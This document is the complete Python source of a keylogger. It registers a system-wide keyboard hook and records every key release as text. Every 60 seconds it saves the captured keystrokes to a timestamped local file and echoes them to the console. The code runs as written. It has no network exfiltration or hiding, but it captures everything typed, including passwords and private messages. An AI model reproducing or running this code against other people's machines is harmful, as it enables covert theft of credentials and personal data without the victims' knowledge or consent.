import keyboard
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on

class Keylogger:
    def __init__(self, interval, report_method="file"):
        """
        Initializes the Keylogger object with the specified reporting interval and report method.
        """
        self.interval = interval
        self.report_method = report_method
        self.log = ""  # Variable to store keystrokes
        self.start_dt = datetime.now()  # Start datetime of keylogging session
        self.end_dt = datetime.now()  # End datetime of keylogging session

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event occurs.
        It records the name of the pressed key and appends it to the log.
        """
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
    
    def update_filename(self):
        """
        Updates the filename based on the start and end datetimes.
        """
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """
        Writes the keylogs to a file.
        """
        with open(f"{self.filename}.txt", "w") as f:
            f.write(self.log)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
        """
        Initiates the reporting process.
        If there are keylogs in the log, it updates the filename,
        reports the keylogs to the file, and resets the log.
        It then schedules the next report using a Timer object.
        """
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
                print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True  # Set the timer thread as a daemon
        timer.start()

    def start(self):
        """
        Starts the keylogger.
        Sets up the event listener, initiates reporting, and waits for keyboard events.
        Handles KeyboardInterrupt gracefully when CTRL+C is pressed.
        """
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)  # Register the callback function
        self.report()  # Initiate reporting
        print(f"{datetime.now()} - Started keylogger")
        try:
            keyboard.wait()  # Wait for keyboard events
        except KeyboardInterrupt:
            print("Keylogger stopped by user.")

if __name__ == "__main__":
    # Create an instance of Keylogger and start keylogging
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
